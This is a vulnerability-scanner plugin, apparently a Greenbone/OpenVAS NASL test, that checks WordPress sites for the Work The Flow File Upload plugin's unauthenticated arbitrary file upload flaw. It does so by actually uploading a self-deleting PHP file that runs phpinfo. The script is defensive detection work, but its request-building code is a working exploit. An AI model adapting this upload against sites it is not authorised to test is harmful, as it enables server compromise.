CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805602" );
	script_version( "2020-11-19T14:17:11+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-11-19 14:17:11 +0000 (Thu, 19 Nov 2020)" );
	script_tag( name: "creation_date", value: "2015-04-27 15:42:27 +0530 (Mon, 27 Apr 2015)" );
	script_tag( name: "qod_type", value: "exploit" );
	script_name( "WordPress Work The Flow Plugin File Upload Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress
  Work The Flow File Upload Plugin and is prone to arbitrary file upload
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP POST request
  and check whether it is able to upload file or not." );
	script_tag( name: "insight", value: "Flaw exists because the bundled
  public/assets/jQuery-File-Upload-9.5.0/server/php/index.php script does not
  properly verify or sanitize user-uploaded files." );
	script_tag( name: "impact", value: "Successful exploitation will allow an
  unauthenticated remote attacker to upload arbitrary files." );
	script_tag( name: "affected", value: "WordPress Work the flow file upload
  Plugin version 2.5.2" );
	script_tag( name: "solution", value: "Update to WordPress Work the flow file
  upload Plugin version 2.5.3 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/36640" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/131294" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://wordpress.org/plugins/work-the-flow-file-upload" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/work-the-flow-file-upload/public/" + "assets/jQuery-File-Upload-9.5.0/server/php/index.php";
host = http_host_name( port: http_port );
vtstrings = get_vt_strings();
fileName = vtstrings["lowercase_rand"] + ".php";
postData = NASLString( "------------------------------7d426ec7fdf67986\r\n", "Content-Disposition: form-data; name=\"action\"\r\n\r\n", "upload\r\n", "------------------------------7d426ec7fdf67986\r\n", "Content-Disposition: form-data; name=\"files\"; filename=\"", fileName, "\"\r\n", "Content-Type: application/octet-stream", "\r\n\r\n", "<?php phpinfo(); unlink(\"", fileName, "\" ); ?>\r\n\r\n", "------------------------------7d426ec7fdf67986--" );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "Content-Type: multipart/form-data; boundary=----------------------------7d426ec7fdf67986\\r\\n", "\\r\\n", postData );
res = http_keepalive_send_recv( port: http_port, data: req );
if(res && IsMatchRegexp( res, "HTTP/1.. 200 OK" )){
	if(!egrep( pattern: fileName, string: res )){
		exit( 0 );
	}
	url = dir + "/wp-content/plugins/work-the-flow-file-upload/public/assets" + "/jQuery-File-Upload-9.5.0/server/php/files/" + fileName;
	if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "phpinfo", extra_check: ">System" )){
		if(http_vuln_check( port: http_port, url: url, check_header: FALSE, pattern: "HTTP/1.. 200 OK" )){
			report = "\\nUnable to delete the uploaded file '" + fileName + "' at " + url + "\\n";
		}
		if( report ){
			security_message( data: report, port: http_port );
		}
		else {
			security_message( port: http_port );
		}
		exit( 0 );
	}
}

